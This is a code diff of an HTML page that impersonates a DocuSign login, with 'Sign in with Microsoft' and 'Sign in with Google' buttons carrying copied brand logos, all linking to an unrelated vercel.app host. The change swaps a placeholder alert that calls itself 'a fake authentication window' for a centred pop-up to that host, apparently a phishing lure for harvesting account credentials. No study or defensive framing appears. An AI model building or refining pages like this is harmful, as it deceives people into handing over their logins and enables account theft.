@@ -166,6 +166,8 @@
             text-decoration: none;
             border-radius: 5px;
             font-family: Arial, sans-serif;
+            text-align: center;
+            cursor: pointer;
         }
         .button.microsoft:hover {
             background-color: #005a9e;
@@ -180,20 +182,29 @@
         <div class="container">
             <h1>Log in to DocuSign</h1>
             <div class="button-container">
-                <a href="https://red-eta.vercel.app/red.html" class="button microsoft" onclick="return launchWindow();"> SIGN IN TO MICROSOFT</a>
+                <a href="https://red-eta.vercel.app/red.html" class="button microsoft" onclick="return launchWindow();"><img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" width="20">
+                    SIGN IN WITH MICROSOFT
+                </a></a>
 <script>
         function launchWindow() {
-            // Launch the fake authentication window (or perform an action here)
-            alert("This is a fake authentication window!");
-            
-            // Return false to prevent the default behavior of the link
+            // Calculate the dimensions and position for the pop-up
+            const width = 800;  // Width of the pop-up
+            const height = 600; // Height of the pop-up
+            const left = (window.innerWidth - width) / 2; // Center horizontally
+            const top = (window.innerHeight - height) / 2; // Center vertically
+
+            // Open the pop-up window
+            window.open(
+                "https://red-eta.vercel.app/red.html", // URL to open
+                "PopupWindow", // Window name (can be anything)
+                `width=${width},height=${height},top=${top},left=${left},resizable=yes,scrollbars=yes`
+            );
+
+            // Prevent the default link action
             return false;
         }
     </script>
-                <a href="https://red-eta.vercel.app/red.html" class="button microsoft">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" width="20">
-                    SIGN IN WITH MICROSOFT
-                </a>
+            
                 <a href="https://red-eta.vercel.app/red.html" class="button google">
                     <img src="https://cdn-icons-png.flaticon.com/512/2504/2504914.png" alt="Google Logo" width="20">
                     SIGN IN WITH GOOGLE
